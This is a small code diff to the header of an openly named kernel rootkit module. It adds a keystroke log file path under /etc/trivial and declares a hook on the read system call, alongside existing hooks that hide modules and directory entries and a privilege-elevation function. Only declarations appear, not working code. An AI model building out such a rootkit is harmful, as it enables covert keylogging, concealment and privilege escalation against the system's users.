@@ -29,7 +29,8 @@
 
 #define LINKER_FILE "rootkit.ko"
 #define MODULE_NAME "rootkit"
-#define LOGFILE "useful.txt"
+#define LOGFILE "/etc/trivial/syscall_number.txt"
+#define KEYSTROKE "/etc/trivial/keystrokes.txt"
 
 
 #define R_FLAG_READ		0b00000001
@@ -70,6 +71,7 @@ int hook_sys_kldnext(struct thread *td, struct kldnext_args *uap);
 int hook_sys_getdirentries(struct thread *td, struct getdirentries_args *uap);
 int hook_sys_open(struct thread *, struct open_args *);
 int hook_sys_openat(struct thread * td, struct openat_args * uap);
+int hook_sys_read(struct thread *td, struct read_args * uap);
 
 // Additional functions
 void elevate(struct thread *td);
